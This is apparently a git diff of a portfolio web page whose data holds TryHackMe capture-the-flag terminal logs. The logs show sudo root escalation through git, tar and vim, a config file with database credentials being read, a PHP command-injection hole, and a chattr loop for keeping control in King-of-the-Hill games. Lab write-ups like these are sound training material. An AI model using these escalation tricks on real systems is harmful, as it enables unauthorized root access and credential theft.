-            This key is not known by any other names.
-            Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
-            Warning: Permanently added '10.10.98.241' (ED25519) to the list of known hosts.
-            ** WARNING: connection is not using a post-quantum key exchange algorithm.
-            ** This session may be vulnerable to "store now, decrypt later" attacks.
-            ** The server may need to be upgraded. See https://openssh.com/pq.html
-            @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
-            @         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
-            @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
-            Permissions 0644 for 'id_rsa' are too open.
-            It is required that your private key files are NOT accessible by others.
-            This private key will be ignored.
-            Load key "id_rsa": bad permissions
-            ashu@10.10.98.241's password:
-            Permission denied, please try again.
-            ashu@10.10.98.241's password:
-            Permission denied, please try again.
-            ashu@10.10.98.241's password:
+                  ┌──(root㉿kali)-[/home/kali]
+                  └─# ssh ashu@10.10.98.241 -i id_rsa
+                  The authenticity of host '10.10.98.241 (10.10.98.241)' can't be established.
+                  ED25519 key fingerprint is: SHA256:ndwZ/MwYvbVyLcm8bvjebocizMD1b8pdb2leReW/6ko
+                  This key is not known by any other names.
+                  Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+                  Warning: Permanently added '10.10.98.241' (ED25519) to the list of known hosts.
+                  ** WARNING: connection is not using a post-quantum key exchange algorithm.
+                  ** This session may be vulnerable to "store now, decrypt later" attacks.
+                  ** The server may need to be upgraded. See https://openssh.com/pq.html
+                  @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+                  @         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
+                  @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+                  Permissions 0644 for 'id_rsa' are too open.
+                  It is required that your private key files are NOT accessible by others.
+                  This private key will be ignored.
+                  Load key "id_rsa": bad permissions
+                  ashu@10.10.98.241's password:
+                  Permission denied, please try again.
+                  ashu@10.10.98.241's password:
+                  Permission denied, please try again.
+                  ashu@10.10.98.241's password:
 
-            ┌──(root㉿kali)-[/home/kali]
-            └─# ssh ashu@10.10.98.241 -i id_rsa
-            ** WARNING: connection is not using a post-quantum key exchange algorithm.
-            ** This session may be vulnerable to "store now, decrypt later" attacks.
-            ** The server may need to be upgraded. See https://openssh.com/pq.html
-            @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
-            @         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
-            @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
-            Permissions 0644 for 'id_rsa' are too open.
-            It is required that your private key files are NOT accessible by others.
-            This private key will be ignored.
-            Load key "id_rsa": bad permissions
-            ashu@10.10.98.241's password:
+                  ┌──(root㉿kali)-[/home/kali]
+                  └─# ssh ashu@10.10.98.241 -i id_rsa
+                  ** WARNING: connection is not using a post-quantum key exchange algorithm.
+                  ** This session may be vulnerable to "store now, decrypt later" attacks.
+                  ** The server may need to be upgraded. See https://openssh.com/pq.html
+                  @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+                  @         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
+                  @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+                  Permissions 0644 for 'id_rsa' are too open.
+                  It is required that your private key files are NOT accessible by others.
+                  This private key will be ignored.
+                  Load key "id_rsa": bad permissions
+                  ashu@10.10.98.241's password:
 
-            ┌──(root㉿kali)-[/home/kali]
-            └─# chmod 600 id_rsa
+                  ┌──(root㉿kali)-[/home/kali]
+                  └─# chmod 600 id_rsa
 
-            ┌──(root㉿kali)-[/home/kali]
-            └─# ssh ashu@10.10.98.241 -i id_rsa
-            ** WARNING: connection is not using a post-quantum key exchange algorithm.
-            ** This session may be vulnerable to "store now, decrypt later" attacks.
-            ** The server may need to be upgraded. See https://openssh.com/pq.html
-            Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-91-generic x86_64)
+                  ┌──(root㉿kali)-[/home/kali]
+                  └─# ssh ashu@10.10.98.241 -i id_rsa
+                  ** WARNING: connection is not using a post-quantum key exchange algorithm.
+                  ** This session may be vulnerable to "store now, decrypt later" attacks.
+                  ** The server may need to be upgraded. See https://openssh.com/pq.html
+                  Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-91-generic x86_64)
 
-             * Documentation:  https://help.ubuntu.com
-             * Management:     https://landscape.canonical.com
-             * Support:        https://ubuntu.com/advantage
+                   * Documentation:  https://help.ubuntu.com
+                   * Management:     https://landscape.canonical.com
+                   * Support:        https://ubuntu.com/advantage
 
-            84 packages can be updated.
-            0 updates are security updates.
+                  84 packages can be updated.
+                  0 updates are security updates.
 
-            Last login: Thu Mar 26 12:47:21 2020 from 192.168.197.129
-            ashu@thm-prod:~$ sudo /bin/su skidy
-            skidy@thm-prod:/home/ashu$ sudo PAGER='sh -c "exec sh 0<&1"' /usr/bin/git -p help config
-            # id
-            uid=0(root) gid=0(root) groups=0(root)
-            # cat /home/ashu/flag.txt
-            [REDACTED]
-            # cat /home/ashu/mail-server-backup/support-room-help.txt
-            TO: support@tryhackme.com
-            FROM: epicskidnoob123@yahoo.com
-            SUBJECT: pls help
-            BODY:
-            hi, pls, room no work, ned halp.
+                  Last login: Thu Mar 26 12:47:21 2020 from 192.168.197.129
+                  ashu@thm-prod:~$ sudo /bin/su skidy
+                  skidy@thm-prod:/home/ashu$ sudo PAGER='sh -c "exec sh 0<&1"' /usr/bin/git -p help config
+                  # id
+                  uid=0(root) gid=0(root) groups=0(root)
+                  # cat /home/ashu/flag.txt
+                  [REDACTED]
+                  # cat /home/ashu/mail-server-backup/support-room-help.txt
+                  TO: support@tryhackme.com
+                  FROM: epicskidnoob123@yahoo.com
+                  SUBJECT: pls help
+                  BODY:
+                  hi, pls, room no work, ned halp.
 
-            Regards,
-            e1337 Haxx0r #87
+                  Regards,
+                  e1337 Haxx0r #87
 
-            =======================================================================================
-            REPLY:
+                  =======================================================================================
+                  REPLY:
 
-            Hello, I honestly cannot be bothered to even decipher that, so just have the flag: [REDACTED]
+                  Hello, I honestly cannot be bothered to even decipher that, so just have the flag: [REDACTED]
 
-            Thanks,
-            Ashu - TryHackMe
-            # cat /home/skidy/flag.txt
-            [REDACTED]
-            # cat /var/ftp/flag.txt
-            [REDACTED]
-            # uname -a
-            Linux thm-prod 4.15.0-91-generic #92~16.04.1-Ubuntu SMP Fri Feb 28 14:57:22 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
-            # id
-            uid=0(root) gid=0(root) groups=0(root)`,
+                  Thanks,
+                  Ashu - TryHackMe
+                  # cat /home/skidy/flag.txt
+                  [REDACTED]
+                  # cat /var/ftp/flag.txt
+                  [REDACTED]
+                  # uname -a
+                  Linux thm-prod 4.15.0-91-generic #92~16.04.1-Ubuntu SMP Fri Feb 28 14:57:22 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+                  # id
+                  uid=0(root) gid=0(root) groups=0(root)`,
         },
         {
           title: "Shrek",
           desc: "SSH key access then a classic tar --checkpoint-action GTFOBin for root; cracked CMS Made Simple's DB creds from config.php for the final flag.",
           tags: ["Linux", "GTFOBins", "MySQL"],
           log: String.raw`┌──(root㉿kali)-[/home/kali]
-            └─# nano id_rsa
+                  └─# nano id_rsa
 
-            ┌──(root㉿kali)-[/home/kali]
-            └─# chmod 600 id_rsa
+                  ┌──(root㉿kali)-[/home/kali]
+                  └─# chmod 600 id_rsa
 
-            ┌──(root㉿kali)-[/home/kali]
-            └─# ssh shrek@10.10.220.110 -i id_rsa
-            ** WARNING: connection is not using a post-quantum key exchange algorithm.
-            ** This session may be vulnerable to "store now, decrypt later" attacks.
-            ** The server may need to be upgraded. See https://openssh.com/pq.html
-            Last login: Thu Mar 12 09:39:10 2020 from cyberdyne
-            [shrek@shrek ~]$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
-            [sudo] password for shrek:
-            Sorry, try again.
-            [sudo] password for shrek:
-            sudo: 1 incorrect password attempt
-            [shrek@shrek ~]$ su donkey
-            Password:
-            [donkey@shrek shrek]$ whoami
-            donkey
-            [donkey@shrek shrek]$ id
-            uid=1002(donkey) gid=1002(donkey) groups=1002(donkey)
-            [donkey@shrek shrek]$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
-            tar: Removing leading '/' from member names
-            sh-4.2# whoami
-            root
-            sh-4.2# cat /root/root.txt
-            [REDACTED]
-            sh-4.2# cat /home/shrek/flag.txt
-            [REDACTED]
-            sh-4.2# cat /home/donkey/flag.txt
-            [REDACTED]
-            sh-4.2# cat /home/puss/flag.txt
-            [REDACTED]
-            sh-4.2# cat /srv/web/flag.txt
-            [REDACTED]
-            sh-4.2# cat /var/lib/docker/overlay2/8039e912cd29e964102163c37a1f05795ea99e7da6c1a800dd9749417d88c680/diff/root/flag.txt
-            [REDACTED]
-            sh-4.2# mysql -u username -p -e "SELECT * FROM cms.flag;"
-            Enter password:
-            ERROR 1142 (42000) at line 1: SELECT command denied to user ''@'localhost' for table 'flag'
-            sh-4.2# mysql -u donkey -p -e "SELECT * FROM cms.flag;"
-            Enter password:
-            ERROR 1045 (28000): Access denied for user 'donkey'@'localhost' (using password: YES)
-            sh-4.2# mysql -u root -p
-            Enter password:
-            ERROR 1045 (28000): Access denied for user 'root'@'localhost' (using password: YES)
-            sh-4.2# find /var/www /srv -type f \( -name 'config.php' -o -name '*config*' \) 2>/dev/null
-            /var/www/html/api/config.php
-            /var/www/html/cms/lib/classes/class.cms_config.php
-            /var/www/html/cms/lib/smarty/sysplugins/smarty_config_source.php
-            /var/www/html/cms/lib/smarty/sysplugins/smarty_internal_compile_config_load.php
-            /var/www/html/cms/lib/smarty/sysplugins/smarty_internal_config.php
-            /var/www/html/cms/lib/smarty/sysplugins/smarty_internal_config_file_compiler.php
-            /var/www/html/cms/lib/smarty/sysplugins/smarty_internal_configfilelexer.php
-            /var/www/html/cms/lib/smarty/sysplugins/smarty_internal_configfileparser.php
-            /var/www/html/cms/lib/smarty/sysplugins/smarty_internal_method_clearconfig.php
-            /var/www/html/cms/lib/smarty/sysplugins/smarty_internal_method_compileallconfig.php
-            /var/www/html/cms/lib/smarty/sysplugins/smarty_internal_method_configload.php
-            /var/www/html/cms/lib/smarty/sysplugins/smarty_internal_method_getconfigvariable.php
-            /var/www/html/cms/lib/smarty/sysplugins/smarty_internal_method_getconfigvars.php
-            /var/www/html/cms/lib/smarty/sysplugins/smarty_internal_method_registerdefaultconfighandler.php
-            /var/www/html/cms/lib/smarty/sysplugins/smarty_template_config.php
-            /var/www/html/cms/modules/MicroTiny/templates/tinymce_config.js
-            /var/www/html/cms/config.php
-            sh-4.2# cat /var/www/html/cms/config.php
-            <?php
-            # CMS Made Simple Configuration File
-            # Documentation: https://docs.cmsmadesimple.org/configuration/config-file/config-reference
-            #
-            $config['dbms'] = 'mysqli';
-            $config['db_hostname'] = 'localhost';
-            $config['db_username'] = 'root';
-            $config['db_password'] = 'password';
-            $config['db_name'] = 'cms';
-            $config['db_prefix'] = 'cms_';
-            $config['timezone'] = 'UTC';
-            ?>sh-4.2# mysql -u root -p
-            Enter password:
-            Welcome to the MySQL monitor.  Commands end with ; or \g.
-            Your MySQL connection id is 6
-            Server version: 5.6.47 MySQL Community Server (GPL)
+                  ┌──(root㉿kali)-[/home/kali]
+                  └─# ssh shrek@10.10.220.110 -i id_rsa
+                  ** WARNING: connection is not using a post-quantum key exchange algorithm.
+                  ** This session may be vulnerable to "store now, decrypt later" attacks.
+                  ** The server may need to be upgraded. See https://openssh.com/pq.html
+                  Last login: Thu Mar 12 09:39:10 2020 from cyberdyne
+                  [shrek@shrek ~]$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+                  [sudo] password for shrek:
+                  Sorry, try again.
+                  [sudo] password for shrek:
+                  sudo: 1 incorrect password attempt
+                  [shrek@shrek ~]$ su donkey
+                  Password:
+                  [donkey@shrek shrek]$ whoami
+                  donkey
+                  [donkey@shrek shrek]$ id
+                  uid=1002(donkey) gid=1002(donkey) groups=1002(donkey)
+                  [donkey@shrek shrek]$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+                  tar: Removing leading '/' from member names
+                  sh-4.2# whoami
+                  root
+                  sh-4.2# cat /root/root.txt
+                  [REDACTED]
+                  sh-4.2# cat /home/shrek/flag.txt
+                  [REDACTED]
+                  sh-4.2# cat /home/donkey/flag.txt
+                  [REDACTED]
+                  sh-4.2# cat /home/puss/flag.txt
+                  [REDACTED]
+                  sh-4.2# cat /srv/web/flag.txt
+                  [REDACTED]
+                  sh-4.2# cat /var/lib/docker/overlay2/8039e912cd29e964102163c37a1f05795ea99e7da6c1a800dd9749417d88c680/diff/root/flag.txt
+                  [REDACTED]
+                  sh-4.2# mysql -u username -p -e "SELECT * FROM cms.flag;"
+                  Enter password:
+                  ERROR 1142 (42000) at line 1: SELECT command denied to user ''@'localhost' for table 'flag'
+                  sh-4.2# mysql -u donkey -p -e "SELECT * FROM cms.flag;"
+                  Enter password:
+                  ERROR 1045 (28000): Access denied for user 'donkey'@'localhost' (using password: YES)
+                  sh-4.2# mysql -u root -p
+                  Enter password:
+                  ERROR 1045 (28000): Access denied for user 'root'@'localhost' (using password: YES)
+                  sh-4.2# find /var/www /srv -type f \( -name 'config.php' -o -name '*config*' \) 2>/dev/null
+                  /var/www/html/api/config.php
+                  /var/www/html/cms/lib/classes/class.cms_config.php
+                  /var/www/html/cms/lib/smarty/sysplugins/smarty_config_source.php
+                  /var/www/html/cms/lib/smarty/sysplugins/smarty_internal_compile_config_load.php
+                  /var/www/html/cms/lib/smarty/sysplugins/smarty_internal_config.php
+                  /var/www/html/cms/lib/smarty/sysplugins/smarty_internal_config_file_compiler.php
+                  /var/www/html/cms/lib/smarty/sysplugins/smarty_internal_configfilelexer.php
+                  /var/www/html/cms/lib/smarty/sysplugins/smarty_internal_configfileparser.php
+                  /var/www/html/cms/lib/smarty/sysplugins/smarty_internal_method_clearconfig.php
+                  /var/www/html/cms/lib/smarty/sysplugins/smarty_internal_method_compileallconfig.php
+                  /var/www/html/cms/lib/smarty/sysplugins/smarty_internal_method_configload.php
+                  /var/www/html/cms/lib/smarty/sysplugins/smarty_internal_method_getconfigvariable.php
+                  /var/www/html/cms/lib/smarty/sysplugins/smarty_internal_method_getconfigvars.php
+                  /var/www/html/cms/lib/smarty/sysplugins/smarty_internal_method_registerdefaultconfighandler.php
+                  /var/www/html/cms/lib/smarty/sysplugins/smarty_template_config.php
+                  /var/www/html/cms/modules/MicroTiny/templates/tinymce_config.js
+                  /var/www/html/cms/config.php
+                  sh-4.2# cat /var/www/html/cms/config.php
+                  <?php
+                  # CMS Made Simple Configuration File
+                  # Documentation: https://docs.cmsmadesimple.org/configuration/config-file/config-reference
+                  #
+                  $config['dbms'] = 'mysqli';
+                  $config['db_hostname'] = 'localhost';
+                  $config['db_username'] = 'root';
+                  $config['db_password'] = 'password';
+                  $config['db_name'] = 'cms';
+                  $config['db_prefix'] = 'cms_';
+                  $config['timezone'] = 'UTC';
+                  ?>sh-4.2# mysql -u root -p
+                  Enter password:
+                  Welcome to the MySQL monitor.  Commands end with ; or \g.
+                  Your MySQL connection id is 6
+                  Server version: 5.6.47 MySQL Community Server (GPL)
 
-            Copyright (c) 2000, 2020, Oracle and/or its affiliates. All rights reserved.
+                  Copyright (c) 2000, 2020, Oracle and/or its affiliates. All rights reserved.
 
-            Oracle is a registered trademark of Oracle Corporation and/or its
-            affiliates. Other names may be trademarks of their respective
-            owners.
+                  Oracle is a registered trademark of Oracle Corporation and/or its
+                  affiliates. Other names may be trademarks of their respective
+                  owners.
 
-            Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+                  Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
 
-            mysql> USE cms;
-            Reading table information for completion of table and column names
-            You can turn off this feature to get a quicker startup with -A
+                  mysql> USE cms;
+                  Reading table information for completion of table and column names
+                  You can turn off this feature to get a quicker startup with -A
 
-            Database changed
-            mysql> SELECT * FROM flag;
-            +----------------------------------+
-            | Flag                             |
-            +----------------------------------+
-            | [REDACTED]                       |
-            +----------------------------------+
-            1 row in set (0.01 sec)
+                  Database changed
+                  mysql> SELECT * FROM flag;
+                  +----------------------------------+
+                  | Flag                             |
+                  +----------------------------------+
+                  | [REDACTED]                       |
+                  +----------------------------------+
+                  1 row in set (0.01 sec)
 
-            mysql>`,
+                  mysql>`,
         },
         {
           title: "Tyler",
           desc: "Password SSH in, escalated via a Vim Python GTFOBin to root; found a command-injection flag hidden in a PHP source comment.",
           tags: ["Linux", "GTFOBins"],
           log: String.raw`┌──(root㉿kali)-[/home/kali]
-            └─# ssh narrator@10.10.145.231
-            The authenticity of host '10.10.145.231 (10.10.145.231)' can't be established.
-            ED25519 key fingerprint is: SHA256:91koJED2zxYATWjl4ZS3xjwpxesiSU1RAbRpASSXIG8
-            This key is not known by any other names.
-            Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
-            Warning: Permanently added '10.10.145.231' (ED25519) to the list of known hosts.
-            ** WARNING: connection is not using a post-quantum key exchange algorithm.
-            ** This session may be vulnerable to "store now, decrypt later" attacks.
-            ** The server may need to be upgraded. See https://openssh.com/pq.html
-            narrator@10.10.145.231's password:
-            Last login: Thu Mar 26 10:52:23 2020 from cyberdyne
-            [narrator@tyler ~]$ whoami
-            narrator
-            [narrator@tyler ~]$ id
-            uid=1002(narrator) gid=1002(narrator) groups=1002(narrator)
-            [narrator@tyler ~]$ /usr/bin/vim -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'
+                  └─# ssh narrator@10.10.145.231
+                  The authenticity of host '10.10.145.231 (10.10.145.231)' can't be established.
+                  ED25519 key fingerprint is: SHA256:91koJED2zxYATWjl4ZS3xjwpxesiSU1RAbRpASSXIG8
+                  This key is not known by any other names.
+                  Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+                  Warning: Permanently added '10.10.145.231' (ED25519) to the list of known hosts.
+                  ** WARNING: connection is not using a post-quantum key exchange algorithm.
+                  ** This session may be vulnerable to "store now, decrypt later" attacks.
+                  ** The server may need to be upgraded. See https://openssh.com/pq.html
+                  narrator@10.10.145.231's password:
+                  Last login: Thu Mar 26 10:52:23 2020 from cyberdyne
+                  [narrator@tyler ~]$ whoami
+                  narrator
+                  [narrator@tyler ~]$ id
+                  uid=1002(narrator) gid=1002(narrator) groups=1002(narrator)
+                  [narrator@tyler ~]$ /usr/bin/vim -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'
 
-            Erase is control-H (^H).
-            sh-4.2# xterm
-            sh: xterm: command not found
-            sh-4.2# ls -la
-            total 20
-            drwx------  4 narrator narrator 138 Mar 26  2020 .
-            drwxr-xr-x. 4 root     root      37 Mar 25  2020 ..
-            drwxr-xr-x  5 narrator narrator  71 Mar 27  2020 app
-            lrwxrwxrwx  1 root     root       9 Mar 26  2020 .bash_history -> /dev/null
-            -rw-r--r--  1 narrator narrator  18 Aug  8  2019 .bash_logout
-            -rw-r--r--  1 narrator narrator 193 Aug  8  2019 .bash_profile
-            -rw-r--r--  1 narrator narrator 231 Aug  8  2019 .bashrc
-            drwx------  2 narrator narrator  61 Mar 25  2020 .ssh
-            -rw-r--r--  1 narrator narrator  33 Mar 26  2020 user.txt
-            -rw-------  1 narrator narrator 676 Mar 25  2020 .viminfo
-            sh-4.2# whoami
-            root
-            sh-4.2# cat /root/root.txt
-            [REDACTED]
-            sh-4.2# cat /home/narrator/user.txt
-            [REDACTED]
-            sh-4.2# cat /home/tdurden/user.txt
-            [REDACTED]
-            sh-4.2# cat /srv/public/flag.txt
-            [REDACTED]
-            sh-4.2# cat /centos_chroot/root/flag.txt
-            [REDACTED]
-            sh-4.2# cat /var/www/html/betatest/checkuser.php
-            <?php
-            if ( isset($_POST['submit'] ) ) {
-            $cmd1 = "cat /etc/passwd | grep " . $_POST['user'];
-            echo system($cmd1);
-            }
-            // flag{[REDACTED]}
-            ?>
-            sh-4.2#`,
+                  Erase is control-H (^H).
+                  sh-4.2# xterm
+                  sh: xterm: command not found
+                  sh-4.2# ls -la
+                  total 20
+                  drwx------  4 narrator narrator 138 Mar 26  2020 .
+                  drwxr-xr-x. 4 root     root      37 Mar 25  2020 ..
+                  drwxr-xr-x  5 narrator narrator  71 Mar 27  2020 app
+                  lrwxrwxrwx  1 root     root       9 Mar 26  2020 .bash_history -> /dev/null
+                  -rw-r--r--  1 narrator narrator  18 Aug  8  2019 .bash_logout
+                  -rw-r--r--  1 narrator narrator 193 Aug  8  2019 .bash_profile
+                  -rw-r--r--  1 narrator narrator 231 Aug  8  2019 .bashrc
+                  drwx------  2 narrator narrator  61 Mar 25  2020 .ssh
+                  -rw-r--r--  1 narrator narrator  33 Mar 26  2020 user.txt
+                  -rw-------  1 narrator narrator 676 Mar 25  2020 .viminfo
+                  sh-4.2# whoami
+                  root
+                  sh-4.2# cat /root/root.txt
+                  [REDACTED]
+                  sh-4.2# cat /home/narrator/user.txt
+                  [REDACTED]
+                  sh-4.2# cat /home/tdurden/user.txt
+                  [REDACTED]
+                  sh-4.2# cat /srv/public/flag.txt
+                  [REDACTED]
+                  sh-4.2# cat /centos_chroot/root/flag.txt
+                  [REDACTED]
+                  sh-4.2# cat /var/www/html/betatest/checkuser.php
+                  <?php
+                  if ( isset($_POST['submit'] ) ) {
+                  $cmd1 = "cat /etc/passwd | grep " . $_POST['user'];
+                  echo system($cmd1);
+                  }
+                  // flag{[REDACTED]}
+                  ?>
+                  sh-4.2#`,
         },
         {
           title: "How to be king",
           desc: "A persistence loop for king.txt-style KoTH challenges: strips the immutable/append-only attribute, overwrites the file with your name, then re-locks it with chattr so other players can't silently take it back.",
           tags: ["KoTH", "Persistence"],
           log: String.raw`while true; do
-          chattr -ia /root/king.txt 2>/dev/null
-          echo 0x7f3a > /root/king.txt 2>/dev/null
-          chattr +ia /root/king.txt 2>/dev/null
-          sleep 0.1
-      done`,
+                chattr -ia /root/king.txt 2>/dev/null
+                echo 0x7f3a > /root/king.txt 2>/dev/null
+                chattr +ia /root/king.txt 2>/dev/null
+                sleep 0.1
+            done`,
         },
       ];
 
       /* Example:
-                          { title: "KoTH: Room name", desc: "Short summary.", tags: ["THM", "KoTH"], href: "https://..." }
-                          */
+                                { title: "KoTH: Room name", desc: "Short summary.", tags: ["THM", "KoTH"], href: "https://..." }
+                                */
 
       const ACHIEVEMENTS = [
         {
@@ -3479,10 +3480,37 @@
         document.addEventListener("keydown", (e) => {
           if (e.key === "Escape") closePop();
         });
+
+        /* ← / → arrow keys: go to previous / next stage */
+        document.addEventListener("keydown", (e) => {
+          if (e.key !== "ArrowLeft" && e.key !== "ArrowRight") return;
+          if (e.ctrlKey || e.metaKey || e.altKey || e.shiftKey) return;
+
+          // only active while the Attack Path view is showing
+          if (document.getElementById("view-attackpath").hidden) return;
+
+          // don't hijack arrows while typing in an input
+          const t = e.target;
+          if (t && (t.tagName === "INPUT" || t.tagName === "TEXTAREA")) return;
+
+          const dir = e.key === "ArrowRight" ? 1 : -1;
+
+          if (current < 0) {
+            // nothing open yet: → opens the first stage, ← opens the last
+            e.preventDefault();
+            openPop(dir === 1 ? 0 : ATTACK_PATH.length - 1);
+            return;
+          }
+
+          const nextIdx = current + dir;
+          if (nextIdx < 0 || nextIdx >= ATTACK_PATH.length) return; // stop at the ends
+          e.preventDefault();
+          openPop(nextIdx, pop.contains(document.activeElement));
+        });
+
         window.addEventListener("resize", closePop);
         window.__apClose = closePop;
       })();
-
       (function themeToggle() {
         const root = document.documentElement;
         const btn = document.getElementById("themeBtn");
